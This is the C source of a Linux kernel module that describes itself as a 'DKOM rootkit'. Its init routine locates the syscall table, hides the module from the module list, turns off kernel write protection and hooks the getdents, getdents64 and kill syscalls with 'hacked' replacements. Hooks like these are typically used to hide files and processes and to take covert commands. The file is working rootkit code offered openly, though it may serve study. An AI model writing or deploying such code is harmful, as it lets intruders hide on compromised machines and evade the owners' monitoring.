#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/proc_ns.h>
#include <linux/fdtable.h>
#include <linux/kprobes.h>

#include "dkom_config.h"

MODULE_LICENSE("MIT");
MODULE_AUTHOR("Fotis Paraskevopoulos");
MODULE_DESCRIPTION("DKOM rootkit");


///////////////////////////////
//  Module Initialisation
///////////////////////////////
static unsigned long *__sys_call_table;

static int __init dkom_rootkit_init(void) {

	printk(KERN_INFO "-------------------------------\n");
	printk(KERN_INFO "ABOUT TO LOAD THE ROOTKIT\n");
  printk(KERN_INFO "-------------------------------\n");

	__sys_call_table = get_syscall_table_bf();

	if (!__sys_call_table) return -1;

	cr0 = read_cr0();

	module_hide();
	tidy();

	orig_getdents = (t_syscall)__sys_call_table[__NR_getdents];
	orig_getdents64 = (t_syscall)__sys_call_table[__NR_getdents64];
	orig_kill = (t_syscall)__sys_call_table[__NR_kill];

	unprotect_memory();

	__sys_call_table[__NR_getdents] = (unsigned long) hacked_getdents;
	__sys_call_table[__NR_getdents64] = (unsigned long) hacked_getdents64;
	__sys_call_table[__NR_kill] = (unsigned long) hacked_kill;

	protect_memory();

	printk(KERN_INFO "-------------------------------\n");
	printk(KERN_INFO "MODULE INITIALISED\n");
  printk(KERN_INFO "-------------------------------\n");

	return 0;
}


static void __exit dkom_rootkit_cleanup(void) {
	unprotect_memory();

	__sys_call_table[__NR_getdents] = (unsigned long) orig_getdents;
	__sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
	__sys_call_table[__NR_kill] = (unsigned long) orig_kill;

	protect_memory();
}


module_init(dkom_rootkit_init);
module_exit(dkom_rootkit_cleanup);